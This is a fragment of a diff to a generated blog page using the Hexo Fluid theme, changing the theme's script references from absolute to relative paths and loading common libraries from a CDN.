                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -560,8 +687,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script  src="../../../../../js/events.js" ></script>
+<script  src="../../../../../js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -600,7 +727,7 @@
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
+    <script  src="../../../../../js/img-lazyload.js" ></script>
   
 
 
@@ -737,7 +864,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/js/local-search.js" ></script>
+  <script  src="../../../../../js/local-search.js" ></script>
 
 
 
@@ -745,7 +872,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script  src="../../../../../js/boot.js" ></script>
 
 
   
